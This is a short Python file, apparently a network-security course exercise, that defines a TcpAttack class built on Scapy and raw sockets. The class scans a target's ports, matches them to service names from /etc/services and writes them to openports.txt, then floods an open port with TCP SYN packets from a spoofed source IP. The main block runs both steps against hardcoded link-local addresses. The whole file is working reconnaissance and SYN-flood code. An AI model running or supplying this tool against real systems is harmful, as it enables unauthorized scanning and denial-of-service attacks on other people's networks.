from scapy.layers.inet import IP, TCP, ICMP
from scapy.packet import Raw
from scapy.all import send
from scapy.volatile import RandShort
import socket
import sys
import os
import re

class TcpAttack:
    def __init__(self, spoofIP,targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self,lower,upper): #Adapted from lecture slides
        ports = []
        for port in range(lower, upper + 1):
            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP,port))
                ports.append(port)
            except:
                pass
        sps = {}
        if os.path.exists("/etc/services"): #Match open ports with their purposes
            with open("/etc/services") as IN:
                for line in IN:
                    line = line.strip()
                    if line == '': continue
                    if re.match( r'^\s*#', line): continue
                    entries = re.split(r'\s+', line)
                    sps[entries[1]] = ' '.join(re.split(r'\s+',line))
        OUT = open("openports.txt",'w') #Write sorted open ports to file
        if ports:
            for i in range(0,len(ports)):
                if len(sps) > 0:
                    for name in sorted(sps):
                        pattern = r'^' + str(ports[i]) + r'/'
                        if re.search(pattern,str(name)):
                            print("%d:    %s" %(ports[i], sps[name]))
                else:
                    print(ports[i])
                OUT.write("%s\n" % ports[i])
        OUT.close()
        return ports


    def attackTarget(self,port,numSyn):
        sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
        sock.settimeout(0.1)
        try:
            sock.connect((self.targetIP,port))
        except:
            return False #If target port is not open exit
        for i in range(numSyn): #Send numSyn amount of packets 
            send(IP(src=self.spoofIP,dst=self.targetIP)/TCP(flags="S", sport=RandShort(), dport=(port) ))
        return True

if __name__ == "__main__":
    spoof_ip = '169.254.214.186'
    target_ip = '169.254.214.181'
    TeeCP = TcpAttack(spoof_ip,target_ip)
    TeeCP.scanTarget(130,140)
    TeeCP.attackTarget(135, 10)